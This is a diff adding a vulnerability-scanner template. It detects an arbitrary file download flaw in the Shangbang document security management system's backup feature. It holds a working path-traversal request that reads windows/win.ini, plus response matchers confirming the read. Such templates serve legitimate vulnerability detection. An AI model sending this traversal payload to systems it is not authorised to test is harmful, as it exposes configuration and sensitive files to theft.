@@ -1,0 +1,45 @@
+id: shangbang-edsms-backup-anyfile-download
+info:
+  name: Shangbang Document Security Management System Backup Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects a file download vulnerability in Shangbang Document Security Management System, where attackers can retrieve arbitrary files like the system configuration or sensitive files by exploiting the backup functionality.
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "电子文档安全管理系统"
+
+  - raw:
+      - |
+        GET /resources/backup//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "bit app support"
+      - type: regex
+        part: body
+        regex:
+          - "^(?!.*<).*$"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
